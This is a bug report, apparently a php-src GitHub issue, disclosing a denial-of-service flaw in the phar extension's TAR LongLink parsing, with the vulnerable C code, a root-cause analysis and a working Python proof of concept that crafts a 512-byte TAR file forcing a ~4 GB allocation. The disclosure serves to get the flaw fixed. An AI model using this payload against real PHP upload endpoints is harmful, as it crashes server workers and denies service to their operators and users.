# ext/phar: LongLink TAR entry causes ~4 GB allocation due to missing upper-bound check (DoS)

- URL: https://github.com/php/php-src/issues/22556
- Repo: php/php-src (language: C)
- State: open; created 2026-07-02T14:31:57Z; status ok; passes main

## Issue body

reporter (CONTRIBUTOR) · crystarm · 2026-07-02T14:31:57Z · https://github.com/php/php-src/issues/22556

### Description

# ext/phar: LongLink TAR entry causes ~4 GB allocation due to missing upper-bound check (DoS)

## Summary

`phar_parse_tarfile()` in `ext/phar/tar.c` allocates memory for a `././@LongLink` filename directly from a `uint32_t` size field read out of the TAR header, with no upper-bound validation. A crafted TAR file of **512 bytes** causes PHP to attempt `malloc(4294967273)` (~4 GB), triggering a fatal out-of-memory error that kills the PHP process.

The existing check only rejects the values `0` and `UINT_MAX`; every value in between passes through to the allocator unchecked.

Affected versions: **PHP 8.3**, **PHP 8.4** (verified). The same code path exists in `master` (where `pemalloc` was replaced by `zend_string_alloc`, but the guard logic is identical).

---

## Affected code

**`ext/phar/tar.c`**, LongLink handling block:

```c
if (!last_was_longlink && hdr->typeflag == 'L') {
    last_was_longlink = 1;
    /* support the ././@LongLink system for storing long filenames */
    entry.filename_len = entry.uncompressed_filesize;  // <-- uint32_t from TAR header

    if (entry.filename_len == UINT_MAX || entry.filename_len == 0) {  // <-- only two sentinels
        if (error) {
            spprintf(error, 4096, "phar error: \"%s\" is a corrupted tar file (invalid entry size)", fname);
        }
        php_stream_close(fp);
        phar_destroy_phar_data(myphar);
        return FAILURE;
    }
    entry.filename = pemalloc(entry.filename_len + 1, myphar->is_persistent);  // <-- !! unchecked
```

The comment references "bug 61065" — the original fix from ~2012 that added the `== UINT_MAX` guard. That fix was incomplete: it only excluded the single maximum `uint32_t` value, leaving the entire range `[1, UINT_MAX-1]` unguarded.

The same logic exists in `master` with `zend_string_alloc`:

```c
if (entry.uncompressed_filesize == UINT_MAX || entry.uncompressed_filesize == 0) {
    // ...
}
entry.filename = zend_string_alloc(entry.uncompressed_filesize, myphar->is_persistent);
```

---

## Root cause

`phar_tar_number()` decodes the 12-byte octal size field from the TAR header into a `uint32_t`. For a well-formed `././@LongLink` entry the `size` field contains the length of the filename that follows — normally a few dozen to a few hundred bytes. No maximum is enforced anywhere in the format, so a crafted entry can set this field to any value up to `0xFFFFFFFF` (4 294 967 295).

The guard added by bug 61065 only rejects `0` (empty) and `UINT_MAX` (overflow sentinel). Any value such as `0xFFFFFFE8` (4 294 967 272) bypasses both checks and reaches the allocator:

```
entry.filename_len = 0xFFFFFFE8   (= 4 294 967 272)
pemalloc(entry.filename_len + 1)  = pemalloc(4 294 967 273)  ≈ malloc(4.0 GiB)
```

After the huge allocation fails (or succeeds then immediately fails the subsequent `php_stream_read` length check), the error is handled — but the damage is already done: the process either consumed gigabytes of virtual memory or was killed by the OOM killer / `memory_limit` enforcement before reaching the cleanup path.

---

## Reproduction

### PoC file

A minimal reproducer is a single 512-byte TAR block (one header, no data) with:

- `name` = `././@LongLink`
- `typeflag` = `L`
- `size` = octal `777777777750` → decimal `4 294 967 272` (`0xFFFFFFE8`)
- valid checksum

Generate with Python:

```python
#!/usr/bin/env python3
"""
poc_phar_tar_oom.py — generates a 512-byte TAR file that triggers
malloc(4294967273) inside phar_parse_tarfile() via an oversized LongLink entry.
"""
import sys

hdr = bytearray(512)

name = b'././@LongLink'
hdr[0:len(name)] = name
hdr[100:108] = b'0000644\x00'   # mode
hdr[108:116] = b'0000000\x00'   # uid
hdr[116:124] = b'0000000\x00'   # gid
hdr[124:136] = b'777777777750'  # size = 0xFFFFFFE8 in octal
hdr[136:148] = b'00000000000\x00'  # mtime
hdr[148:156] = b'        '      # checksum placeholder
hdr[156]     = ord('L')         # typeflag = LongLink

# compute checksum (unsigned sum of all header bytes)
csum = sum(hdr) & 0xFFFF
hdr[148:155] = ('%06o\x00' % csum).encode()
hdr[155] = ord(' ')

sys.stdout.buffer.write(bytes(hdr))
```

```sh
python3 poc_phar_tar_oom.py > poc.tar
```

### PHP reproducer

```php
<?php
// triggers: PHP Fatal error: Out of memory (tried to allocate 4294967273 bytes)
$p = new PharData('poc.tar');
```

Run with a virtual memory cap to make the OOM immediate and deterministic:

```sh
# With ulimit (simulates a resource-limited server process):
ulimit -v 524288   # 512 MB virtual memory
php reproduce.php

# Expected output:
# mmap() failed: [12] Cannot allocate memory
# mmap() failed: [12] Cannot allocate memory
# PHP Fatal error: Out of memory (allocated 2097152 bytes)
#                  (tried to allocate 4294967273 bytes) in reproduce.php on line 2
```

Without `ulimit`, on a machine with enough RAM, `malloc` may succeed (allocating ~4 GB of virtual memory), after which `php_stream_read` immediately returns 0 bytes (the file is truncated), the code frees the allocation and returns `FAILURE` with a "truncated" error — but the process will have briefly held ~4 GB of virtual address space. On systems where the OOM killer is aggressive or `memory_limit` is in play, the process dies.

### Verified on

| PHP version | Source | Result |
|---|---|---|
| PHP 8.3 (custom build with ASan/libFuzzer) | local `php-fuzz-phar-tar` | `libFuzzer: out-of-memory (malloc(4294967273))` |
| PHP 8.4.21 (Debian package, NTS) | `php8.4 reproduce.php` | `Fatal error: Out of memory (tried to allocate 4294967273 bytes)` |
| PHP 8.4.21 (Debian package, NTS) | `ulimit -v 524288 php8.4 reproduce.php` | `mmap() failed` + `Fatal error: Out of memory` (process killed) |

---

## Why this matters

### Reachable without privileges

`PharData` is used in countless frameworks and CMS plugins to handle user-uploaded archives (themes, plugins, backups, data imports). Any code path that calls `new PharData($user_supplied_file)` or `Phar::loadPhar()` / `phar_open_from_fp()` on untrusted input is affected. The phar extension is enabled by default.

### `memory_limit` does not protect

`phar_parse_tarfile()` calls `pemalloc()` → `__zend_malloc()` → `malloc()`. This path goes through PHP's allocator but the large allocation triggers the per-request `memory_limit` enforcement, which issues a `PHP Fatal error` and aborts the request. On PHP-FPM the worker process exits; the master respawns it, but a sustained stream of such requests will continuously restart workers, effectively DoS-ing the server.

### No authentication required

The crafted file is 512 bytes. Sending it via a file upload field, a REST API that accepts archives, or any other intake point that passes the file to the phar extension is sufficient. No login or special permissions are needed on the attacker side.

### `phar.readonly` does not protect

The `phar.readonly` INI directive restricts *writing* to phar archives. Parsing (reading) a TAR file proceeds regardless of this setting; the vulnerability lies in the parser, not the writer.

---

## Discovery

Found via coverage-guided fuzzing (`libFuzzer` + ASan) of `sapi/fuzzer/php-fuzz-phar-tar`. The fuzzer generated 2 749 distinct OOM artifacts, all triggering the same allocation path in `phar_parse_tarfile()` at `tar.c:375`.

## References

- `././@LongLink` TAR extension:
  https://www.gnu.org/software/tar/manual/html_node/Standard.html


